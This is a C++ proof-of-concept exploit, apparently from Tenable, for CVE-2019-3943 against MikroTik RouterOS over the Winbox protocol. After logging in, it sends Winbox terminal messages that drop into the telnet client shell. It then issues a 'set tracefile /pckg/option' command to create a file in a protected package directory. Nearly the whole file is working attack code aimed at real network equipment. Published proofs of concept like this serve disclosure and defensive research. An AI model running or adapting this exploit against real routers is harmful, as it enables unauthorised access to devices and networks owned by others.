/*
    Copyright 2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#include <fstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"

namespace
{
    const char s_version[] = "CVE-2019-3943 PoC Using SNMP dlopen";

    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_username, std::string& p_password,
                          std::string& p_ip, std::string& p_port)
    {
        boost::program_options::options_description description("options");
        description.add_options()
        ("help,h", "A list of command line options")
        ("version,v", "Display version information")
        ("username,u", boost::program_options::value<std::string>(), "The user to log in as")
        ("password", boost::program_options::value<std::string>(), "The password to log in with")
        ("port,p", boost::program_options::value<std::string>()->default_value("8291"), "The Winbox port to connect to")
        ("ip,i", boost::program_options::value<std::string>(), "The IPv4 address to connect to");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << "\n" << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("username") && argv_map.count("ip") &
            argv_map.count("port"))
        {
            p_username.assign(argv_map["username"].as<std::string>());
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_port.assign(argv_map["port"].as<std::string>());

            if (argv_map.count("password"))
            {
                p_password.assign(argv_map["password"].as<std::string>());
            }
            else
            {
                p_password.assign("");
            }
            return true;
        }
        else
        {
            std::cerr << description << std::endl;
        }

        return false;
    }
}

int main(int p_argc, const char** p_argv)
{
    std::string username;
    std::string password;
    std::string ip;
    std::string port;
    if (!parseCommandLine(p_argc, p_argv, username, password, ip, port))
    {
        return EXIT_FAILURE;
    }
    Winbox_Session winboxSession(ip, port);
    if (!winboxSession.connect())
    {
        std::cerr << "Failed to connect to the remote host" << std::endl;
        return EXIT_FAILURE;
    }

    boost::uint32_t p_session_id = 0;
    if (!winboxSession.login(username, password, p_session_id))
    {
        std::cerr << "[-] Login failed." << std::endl;
        return false;
    }

    WinboxMessage msg;
    msg.set_to(0x4c);
    msg.set_command(0xa0065);
    msg.set_request_id(1);
    msg.set_reply_expected(true);
    msg.add_u32(5,80); // height
    msg.add_u32(6,24); // width
    msg.add_u32(8,1);  // controls method. 0 (nova/bin/login), 1 (telnet), 2 (ssh), 3 (mactel), 4 (nova/bin/telser), default...
    msg.add_string(0x0a, username); //username
    msg.add_string(1,"");
    msg.add_string(7, "vt102");
    msg.add_string(9, "-l a"); // drop into telnet client shell
    winboxSession.send(msg);

    msg.reset();
    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }

    if (msg.has_error())
    {
        std::cout << "error: " << msg.get_error_string() << std::endl;
    }

    boost::uint32_t session_id = msg.get_u32(0xfe0001);

    msg.reset();
    msg.set_to(0x4c);
    msg.set_command(0xa0068);
    msg.set_request_id(2);
    msg.set_reply_expected(true);
    msg.add_u32(5,82);
    msg.add_u32(6,24);
    msg.add_u32(0xfe0001, session_id);
    winboxSession.send(msg);

    boost::uint32_t tracker = 0;
    msg.reset();
    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }

    msg.reset();
    msg.set_to(0x4c);
    msg.set_command(0xa0067);
    msg.set_request_id(3);
    msg.set_reply_expected(true);
    msg.add_u32(3, tracker);
    msg.add_u32(0xfe0001, session_id);
    winboxSession.send(msg);

    msg.reset();
    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }

    if (msg.has_error())
    {
        std::cout << msg.serialize_to_json() << std::endl;
        std::cout << "error: " << msg.get_error_string() << std::endl;
        return EXIT_FAILURE;
    }
    else if (!msg.get_raw(0x02).empty())
    {
        std::string raw_payload(msg.get_raw(0x02));
        tracker += raw_payload.size();
    }

    //{u3:1047,ufe0001:0,uff0007:655463,r2:[115],Uff0001:[76],Uff0002:[0,456]}
    msg.reset();
    msg.set_to(0x4c);
    msg.set_command(0xa0067);
    msg.set_request_id(4);
    msg.set_reply_expected(true);
    msg.add_u32(3, tracker);
    msg.add_u32(0xfe0001, session_id);
    msg.add_raw(2, "set tracefile /pckg/option\n");
    winboxSession.send(msg);

    bool found_telnet_prompt = false;
    while (!found_telnet_prompt)
    {
        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return EXIT_FAILURE;
        }

        if (msg.has_error())
        {
            std::cout << msg.serialize_to_json() << std::endl;
            std::cout << "error: " << msg.get_error_string() << std::endl;
            return EXIT_FAILURE;
        }
        else if (!msg.get_raw(0x02).empty())
        {
            std::string raw_payload(msg.get_raw(0x02));
            if (raw_payload.find("telnet> ") != std::string::npos)
            {
                std::cout << "Success!" << std::endl;
                found_telnet_prompt = true;
            }
        }
    }

    return EXIT_SUCCESS;
}

